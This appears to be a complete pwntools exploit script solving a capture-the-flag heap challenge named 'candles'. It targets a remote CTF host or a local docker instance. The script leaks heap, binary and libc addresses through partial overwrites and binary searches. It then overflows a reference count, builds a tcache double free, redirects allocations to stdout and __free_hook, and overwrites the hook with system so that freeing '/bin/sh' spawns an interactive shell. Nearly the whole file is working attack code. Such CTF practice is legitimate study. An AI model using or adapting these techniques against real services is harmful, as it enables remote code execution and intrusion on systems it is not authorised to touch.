from pwn import *
context.arch="amd64"

elf = ELF("./candles",False)
elf.symbols['candles'] = 0x50c0
libc = ELF("./libc-2.31.so",False)

if 'rem' in sys.argv:
    r = remote("leakguardv2.hackthe.vote", 3451)
else:
    if '-d' in sys.argv:
        os.system("docker exec candles2 pkill -9 candles")
        os.system("docker exec candles2 pkill -9 gdb")
    r = remote("0", 3451)
    if '-d' in sys.argv:
        os.system("docker exec candles2 pidof candles > /tmp/ddd")
        pid = int(open("/tmp/ddd","r").read().split(' ')[0])
        script = '''
        codebase
        set $cc = $code+0x50c0
        set $ww = $code+0x51c0
        c
        '''
        open("/tmp/script.gdb","w").write(script)
        os.system("docker cp /tmp/script.gdb candles2:/tmp/script.gdb")
        run_in_new_terminal("docker exec -it candles2 gdb -q /candles %d -x /tmp/script.gdb"%pid)
        pid = pidof("candles")[0]
        proc.wait_for_debugger(pid)

menu = "Choice: "
def make_wax(frag, dye):
    r.sendafter(menu, "1\0")
    r.sendafter(menu, "%d\0"%frag)
    r.sendafter(menu, "%d\0"%dye)
def make_raw(frag, dye):
    r.send("1".ljust(0x1f,'\0')+("%d"%frag).ljust(0x1f,'\0')+("%d"%dye).ljust(0x1f,'\0'))
def dump_wax(idx):
    r.sendafter(menu, "2\0")
    r.sendafter(menu, "%d\0"%idx)
def dump_raw(idx):
    r.send("2".ljust(0x1f,'\0')+("%d"%idx).ljust(0x1f,'\0'))
def pour_candle(idx, name):
    r.sendafter(menu, "3\0")
    r.sendafter(menu, "%d\0"%idx)
    if name is not None:
        r.sendafter(":\n", name)
def pour_raw(idx, name):
    r.send("3".ljust(0x1f,'\0')+("%d"%idx).ljust(0x1f,'\0')+name.ljust(16,'\0'))
def list_candles():
    r.sendafter(menu, "4\0")
def sell_candle(idx):
    r.sendafter(menu, "5\0")
    r.sendafter(menu, "%d\0"%idx)
def sell_raw(idx):
    r.send("5".ljust(0x1f,'\0')+("%d"%idx).ljust(0x1f,'\0'))
def dbg():
    if '-d' in sys.argv:
        time.sleep(.2)
        os.system("docker exec candles2 pkill -SIGINT candles")

make_wax(0, 0)
make_wax(0, 0)
make_wax(0, 0)

pour_candle(0, "c0")
pour_candle(0, "c1")
sell_candle(0)
sell_candle(1)

pour_candle(0, "\x01\x01")
list_candles()
r.recvuntil("0: ")
heap = u64(r.recvuntil("\n1: ", drop=True).ljust(8,'\0'))-0x101
sell_candle(0)
print "partial: "+hex(heap)
if heap < 0:
    raise Exception("bad heap base...")

# binary search 2nd byte of heap base
lo = 1
hi = 0xf
while lo != hi:
    print "%d %d"%(lo, hi)
    mid = (lo+hi)/2
    if lo+1 == hi and mid == lo:
        mid = hi
    pour_candle(0, "A"+p8(mid*0x10))
    list_candles()
    r.recvuntil("0: ")
    leak = r.recvuntil("\n1: ", drop=True)
    sell_candle(0)
    r.recvuntil("sold\n")
    if set(leak) == set('\0'):
        hi = mid-1
    else:
        lo = mid
heap += (lo+1)*0x1000
print "HEAP: "+hex(heap)

# fill tcache
for i in xrange(7):
    pour_raw(2, "tfill\0")
make_raw(0, 0)
for i in xrange(7):
    sell_raw(i)
dump_raw(3) # frees to fastbin

# now need to consume tcache before getting back fastbin...
for i in xrange(7):
    pour_raw(2, "tfill\0")
r.recvuntil("dumped")
for i in xrange(7):
    r.recvuntil("poured")
pour_candle(2, "A"*8+"\x01\x01")
list_candles()
r.recvuntil("A"*8)

text = u64(r.recvuntil("\n1: ", drop=True).ljust(8,'\0'))-0x101
print "partial: "+hex(text)
if text < 0:
    raise Exception("bad text base...")

# cant bin search this one, because it doesnt necessarily cover an entire 0x10000 region
for pgno in xrange(1, 0xf):
    print "%d"%pgno
    # fill tcache
    for i in xrange(7):
        sell_raw(i)
    sell_raw(7) # frees to fastbin
    # consume tcache
    for i in xrange(7):
        pour_raw(2, "tfill\0")
    for i in xrange(7):
        r.recvuntil("poured")
    pour_candle(2, "A"*9+p8(pgno*0x10))
    list_candles()
    r.recvuntil("A"*8)
    leak = r.recvuntil("\n1: ", drop=True)
    if set(leak) == set('\0'):
        text += pgno*0x1000
        break
elf.address = text
print "TEXT: "+hex(elf.address)

# overflow refcnt to 0of waxes 0 and 1
pl = ""
for i in xrange(255):
    pour_raw(0, "A"*16)
    sell_raw(8)
    pour_raw(1, "A"*16)
    sell_raw(8)
for i in xrange(255*2):
    r.recvuntil("sold\n")

# resets refcnt to 1
pour_candle(0, "pwn\0") # candle 8
pour_candle(1, "pwn2\0") # candle 9
sell_candle(9) # waxes[1] freed, becomes 2nd tcache

pour_candle(2, "pad\0")
# reclaim wax, point frag at where waxes[0] tcache key will be
pour_candle(2, flat(1, heap+0x2a8)) # candle 10

# put 6 things in tcache
for i in xrange(6):
    sell_raw(i)
sell_raw(8) # waxes[0] freed, 1st tcache
for i in xrange(7):
    r.recvuntil("sold")

# reclaim, now waxes[0] and candles[0] are the same
pour_candle(2, flat(1, heap))

# consume all tcache but 1
for i in xrange(5):
    pour_candle(2, "tfill\0")

# double free, with tcache count of 3
dump_wax(0) # first free
pour_candle(3, None) # nulls out tcache key
sell_candle(0) # double free

# free/reclaim the uaf'd wax, point frag where candles[11] will be
sell_candle(10)
pour_candle(2, flat(1, elf.symbols['candles']+8*11)) # candle 0

# redirect tcache to stdout symbol in bss, and make stdout the tcache head
# (even though count is 0 at that point, it'll still be written as if part of the linked list)
pour_candle(2, flat(elf.symbols['stdout']))
pour_candle(2, "pad\0")
pour_candle(2, p8(libc.symbols['_IO_2_1_stdout_']&0xff))

# null candles[11] so we lose the reference to the bss chunk
# otherwise printing the candle would null stdout...
pour_candle(3, None)

# free/reclaim the uaf'd wax, point frag back where tcache key will be
sell_candle(0)
pour_candle(2, flat(1, heap+0x2a8))

# stdout is tcache head, get partial leak
sell_candle(1)
pour_candle(2, "\x01\x01\x01")
list_candles()
r.recvuntil("1: ")
mmap = u64(r.recvuntil("\n2: ", drop=True).ljust(8,'\0'))-0x10101
print "partial: "+hex(mmap)
if mmap < 0:
    raise Exception("bad mmap base...")

# binary search 1.5 bytes of mmap base
lo = 1
hi = 0xfff
while lo != hi:
    print "%d %d"%(lo, hi)
    mid = (lo+hi)/2
    if lo+1 == hi and mid == lo:
        mid = hi
    sell_candle(1)
    pour_candle(2, "A"+p16(mid*0x10))
    list_candles()
    r.recvuntil("1: ")
    leak = r.recvuntil("\n2: ", drop=True)
    if set(leak) == set('\0'):
        hi = mid-1
    else:
        lo = mid
mmap += (lo+1)*0x1000
print "MMAP: "+hex(mmap)
libc.address = mmap+0x9000
print "LIBC: "+hex(libc.address)

# put something in tcache
sell_candle(2)

# double free, candles 8 and 10 are the same
sell_candle(8)
pour_candle(3, None) # null tcache key
sell_candle(10)

pour_candle(2, flat(libc.symbols['__free_hook']-1))
pour_candle(2, "/bin/sh\0")
pour_candle(2, "\0"+flat(libc.symbols['system']))

# free /bin/sh
sell_candle(2)

r.interactive()
